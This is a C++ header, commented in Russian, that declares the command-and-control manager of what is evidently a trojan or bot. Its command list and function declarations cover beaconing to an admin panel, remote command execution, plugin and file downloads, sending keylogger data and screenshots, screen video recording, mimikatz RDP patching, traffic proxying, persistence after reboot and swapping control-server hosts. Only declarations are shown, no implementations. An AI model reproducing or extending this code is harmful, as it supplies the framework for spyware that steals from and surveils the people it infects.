#pragma once

#include "core\pipe.h"
#include "core\vector.h"
#include "core\http.h"

class ManagerServer : public PipeServer
{

		//канал который может работать с внешним миром
		struct PipeInet
		{
			char name[32];
			int priority;
		};
		//общие файл, которые могут запрашиваться ботами из различных процессов
		//отключает предупреждение на массив нулевого размера
		#pragma warning ( disable : 4200 )
		struct SharedFile
		{
			char name[128];
			int c_data;
			byte data[0];
		};

		//перенаправляет указанные данные в лог файл
		struct Redirect
		{
			char name[32];
			int logId;
		};

		Vector< MovedPtr<PipeInet> > pipesInet; //зарегистрированные каналы, которые могут отсылать запросы в инет
		Vector< MovedPtr<SharedFile> > sharedFiles; //конфигурационные файлы, скачиваемые с админки
		Vector< MovedPtr<Redirect> > redirects; //какие данные писать в лог
		int currPipeInet; //текущий канал отсылки запросов в инет
		StringBuilderStack<48> pipeTaskServer; //имя канала сервера задач
		StringBuilderStack<48> pipeVideoServer; //имя канала видео сервера
		StringBuilderStack<48> pipeMonProcesses; //имя канала мониторинга процессов

		Mem::Data result; //для возврата каких либо результатов

	public:

		enum 
		{
			CmdReg = 1,			//регистрация канала который может общаться с внешним миром
			CmdGetCmd = 2,		//отстук в админку и получение команды
			CmdSendData = 3,	//отправка данных в админку
			CmdCmdExec = 4,		//выполнить команду
			CmdLoadFile = 5,	//загрузка файла по указнному урлу
			CmdLoadPlugin = 6,	//загрузка плагина
			CmdRegTask = 7,		//регистрация сервера выполнения задач (команд)
			CmdRegVideo = 8,	//регистрация видео сервера
			CmdVideo = 9,		//запись видео
			CmdVideoStop = 10, 	//отстановка видео записи
			CmdAddSharedFile = 11, //добавление конфигурационного файла
			CmdGetSharedFile = 12, //возвращает указанный конфигурационный файл
			CmdSendFileToVideoServer = 13, //отправка файла на видео сервер
			CmdMimikatzPatchRDP = 14,	//патчинг RDP через mimikatz
			CmdVideoServerTunnel = 15,	//создает туннель для связи с связи сервером
			CmdHttpProxy = 16,		//включить http proxy
			CmdIpPortProxy = 17,	//включить проброс трафика на указанный адрес
			CmdSetProxy = 18,	//устанавливает адрес различных прокси для админки
			CmdAddVideoServers = 19,//добавляет адреса видео серверов
			CmdGetGlobalState = 20,	//возвратить глобальное значение состояния
			CmdSetGlobalState = 21,	//установить новое значение глобального состояния
			CmdVideoSendFolderPack = 22, //упаковка папки и отсылка ее на видео сервер
			CmdVideoSendLog = 23,	//отправка лога на видео сервер
			CmdVideoCreateLog = 24,	//создает поток для записи логов на сервер
			CmdRegMonProcesses = 25,//регистрация канала мониторинга процессов
			CmdAddStartCmd = 26,	//добавление команды для выполнения после ребута
			CmdDelProxy = 27,		//удаляет указанные прокси
			CmdGetProxy = 28,		//возвращает настройки прокси
			CmdVideoServerSendStr = 29, //отсылка строки на видео сервер
			CmdVideoServerConnected = 30, //бот соединился с сервером
			CmdVideoServerRestart = 31, //перезапускает видеочасть под указанным юзером
			CmdDupl = 32,			//см. эту команду в AdminPanel
			CmdVideoSendFirstFrame = 33, //отсылка начального кадра для онлайн видео
			CmdNewAdminka = 34,		//смена хостов админки
			CmdSendDataCrossGet = 35, //отсылка строки в админку через GET запрос (передаваемая строка должна обязательно передаваться с завершающим нулем)
			CmdLog = 36,			//отсылка лога в админку, точнее отсылаются числа (коды фраз)
			CmdLoadPluginServer = 37, //загрузка плагина с сервера
			CmdCreateStream = 38, //создание потока для отправки данных
			CmdSendStreamData = 39,	//отсылка данных в поток
			CmdCloseStream = 40,	//закрытие указанного потока (для сервера)
			CmdRedirect = 41		//какие данные перенаправлять в лог
		};

	private:

		struct MsgReg //для команды CmdReg
		{
			char namePipe[32]; //имя канал
			int priority; //приоритет использования такого канала, чем выше число, тем выше приоритет
		};

		virtual int Handler( Pipe::Msg* msgIn, void** msgOut );
		virtual void Disconnect();
		//определяет каким каналом пользоваться для отправки запросов в инет
		int GetNewPipeInet();
		//проверяет на существование текущего канала работы с инетом, и в случае чего назначает новый
		//возвращает номер канала на который можно отсылать данные, -1 - если нет таких каналов
		int GetPipeInet();
		//добавляет в массив общий файл
		void AddSharedFile( SharedFile* file );

	public:

		ManagerServer();
		~ManagerServer();

		//выполняет команды которые передаются админке, эта функция вызывается в отдельном потоке
		//и ждет пока зарегистрируется канал общения с инетом и после передает команды
		void HandlerCmdAdminPanel( Pipe::Msg* msg );
		//данные функции отсылают данные менеджеру, который их передает каналам исполнителям

		//регистрация канала через который идет общение с внешним миром
		static bool RegAdminPanel( PipePoint* pipe, int priority = 0 );
		//регистрация канала сервера задач
		static bool RegTaskServer( PipePoint* pipe );
		//регистрация видео сервера
		static bool RegVideoServer( PipePoint* pipe );
		//регистрация сервера мониторинга процессов
		static bool ManagerServer::RegMonitoringProcesses( PipePoint* pipe );
		//отстук в админку и получение команды от нее, принимать ответ должен serverAnswer, который передаст его func,
		//если serverAnswer = 0, то по умолчанию берется Pipe::serverPipeResponse, который должен быть инициализирован при запуске процесса (Pipe::InitServerPipeResponse())
		static bool GetAdminCmd( Pipe::typeReceiverPipeAnswer func, PipePoint* serverAnswer = 0 );
		//отправляет данные в админку:
		//nameData - имя данных (keylogger, screenshot), data - сами данные, c_data - размер данных
		//file = true - отправляются пост запросом как ContentMultipart, false - как ContentWebForm
		//fileName - имя файла для отправляемых данных
		static bool SendData( const char* nameData, const void* data, int c_data, bool file, const char* fileName = 0 );
		//выполнение команды cmd
		static bool CmdExec( const char* cmd, int len = -1 );
		//загружает файл по указанному урлу
		static bool LoadFile( StringBuilder& url, Pipe::typeReceiverPipeAnswer func, PipePoint* serverAnswer = 0, DWORD tag = 0 );
		//выполняет запрос в указанную админку (type = 0 - обычная, 1 - AZ, -1 - то в file полный урл)
		//file - часть урла после имени хоста
		static bool ExecRequest( int typeHost, StringBuilder& file, Pipe::typeReceiverPipeAnswer func = 0, PipePoint* serverAnswer = 0, DWORD tag = 0 );
		//загружает плагин из админки или сервера, в зависимости как указано в боте
		static bool LoadPlugin( StringBuilder& plugin, Pipe::typeReceiverPipeAnswer func, PipePoint* serverAnswer = 0, DWORD tag = 0 );
		//загружает указанный плагин с админки, если плагин не загрузился, то в func будет передан пустой массив для оповещения, поэтому обязательно проверять
		static bool LoadPluginAdminka( StringBuilder& plugin, Pipe::typeReceiverPipeAnswer func, PipePoint* serverAnswer = 0, DWORD tag = 0 );
		//загружает указанный плагин с сервера, если плагин не загрузился, то в func будет передан пустой массив для оповещения, поэтому обязательно проверять
		static bool LoadPluginServer( StringBuilder& plugin, Pipe::typeReceiverPipeAnswer func, PipePoint* serverAnswer = 0, DWORD tag = 0 );
		//начать запись видео указанного процесса, если pid = 0, то запись всего экрана
		static bool StartVideo( const char* nameVideo, DWORD pid = 0 );
		//отсылка начального кадра для онлайн видео
		static bool SendFirstVideoFrame();
		static bool StopVideo();
		static bool SendFileToVideoServer( const char* typeName, const char* fileName, const char* ext, const void* data, int c_data );
		static bool SendFileToVideoServer( const char* typeName, const char* fileName, const char* ext, const Mem::Data& data )
		{
			return SendFileToVideoServer( typeName, fileName, ext, data.Ptr(), data.Len() );
		}
		static bool SendFileToVideoServer( const char* typeName, const char* fileName, const char* ext, const StringBuilder& s )
		{
			return SendFileToVideoServer( typeName, fileName, ext, s.c_str(), s.Len() );
		}
		static bool SendFolderPackToVideoServer( const char* srcFolder, const char* dstFolder, const char* typeName, const char* fileName, int globalId = -1, Pipe::typeReceiverPipeAnswer func = 0, PipePoint* serverAnswer = 0, DWORD tag = 0 );
		static bool StartVideoServerTunnel( int port, const char* pipeName );
		static bool SendVideoLog( uint idStream, const char* text, int len = -1 );
		static bool CreateVideoLog( const char* nameLog, Pipe::typeReceiverPipeAnswer func, PipePoint* serverAnswer = 0, DWORD tag = 0 );
		static bool CreateVideoStream( int typeId, const char* typeName, const char* fileName, const char* ext,  Pipe::typeReceiverPipeAnswer func, PipePoint* serverAnswer = 0, DWORD tag = 0 );
		//получение ида потока, wait - ожидание ида от бк сервера в миллисекундах
		static uint CreateVideoStream( int typeId, const char* typeName, const char* fileName, const char* ext,  int wait );
		static bool CreateVideoPipeStream( const char* idPipe, const char* namePipe, Pipe::typeReceiverPipeAnswer func, PipePoint* serverAnswer = 0, DWORD tag = 0 )
		{
			return CreateVideoStream( 8, idPipe, namePipe, 0, func, serverAnswer, tag );
		}
		static bool SendVideoStream( uint idStream, const void* data, int c_data );
		static bool CloseStream( uint idStream );
		static bool AddVideoServers( bool force, AddressIpPort* addr, int c_addr );
		static bool VideoServerRestart( const char* nameUser );
		//добавляет в менеджер какой-то общий файл
		static bool AddSharedFile( const char* name, const void* data, int c_data );
		inline static bool AddSharedFile( const char* name, const Mem::Data& data )
		{
			return AddSharedFile( name, data.Ptr(), data.Len() );
		}
		inline static bool AddSharedFile( const char* name, const StringBuilder& s )
		{
			return AddSharedFile( name, s.c_str(), s.Len() + 1 );
		}
		//запрашивает у менеджера общий файл
		static bool GetSharedFile( const char* name, Mem::Data& data );
#ifdef ON_MIMIKATZ
		//после выполнения команды вызывается func
		static bool MimikatzPathRDP( Pipe::typeReceiverPipeAnswer func, DWORD tag, PipePoint* serverAnswer = 0 );
#endif
		static bool StartHttpProxy( int port );
		static bool StartIpPortProxy( int port, AddressIpPort& addr );
		//устанавливает адреса прокси (или нескольких прокси) через который будут идти http запросы в инет
		static bool SetProxy( Proxy::Info* proxy, int c_proxy );
		static bool DelProxy( Proxy::Info* proxy, int c_proxy );
		//возвращение значения глобального состояния
		static char GetGlobalState( int id );
		//установка значения глобального состояния, возвращает старое
		static char SetGlobalState( int id, char v );
		static bool AddStartCmd( const StringBuilder& cmd );
		//дублирование данных отсылаемых в админку в файлы или на сервер
		//dst = 0 - останавливает дублирование, 1 - в файлы, 2 - на сервер, 3 - в файлы и на сервер
		static bool DuplData( uint hashData, int dst );
		//установка новых хостов админки
		static bool SetNewHostsAdminki( StringBuilder& s );
		//отсылает результат выполнения команды в админку
		static bool SendResExecutedCmd( const StringBuilder& cmd, int err, const char* comment = 0 );
		//отсылка кода лога в админку, если flush = true, то данные сразу отправляются, а не буферизируются
		static bool SendLog( bool flush, int code = 0 );
};

//сервер приема команд ото сторонних процессов
class GeneralPipeServer : public PipeServer
{
		virtual int Handler( Pipe::Msg* msgIn, void** msgOut );

	public:

		enum
		{
			CmdTask = 1, //выполнении ботом команды, передается текстовая команда (в data) и ее длина (в sz_data) без учета завершающего нуля
			CmdInfo = 2, //возвращает информацию о боте
			CmdGetProxy = 3 //возвращает установленные в боте прокси
		};

		struct InfoBot
		{
			DWORD pidMain; //пид основного процесса
			DWORD pidServer; //пид видео процесса
			char uid[48];
			char comment[1024]; //информация об окружении бота
		};

	private:

		InfoBot info; //для возврата информации о боте

		Mem::Data result;

	public:

		GeneralPipeServer();
		~GeneralPipeServer();
};

//запуск менеджера и цикла запроса команд
void ManagerLoop( bool runAdminPanel );
//запуск менеджера в отдельном потоке
DWORD WINAPI ManagerLoopThread( void* param );
//загружает klgconfig.plug
void LoadKeyloggerConfig();
//если запущена копия, то обновить уже запущенного бота
//возвращает true, если этому боту нужно завершить работу, иначе продолжить как обычно
bool UpdateIsDublication( const char* dropper );
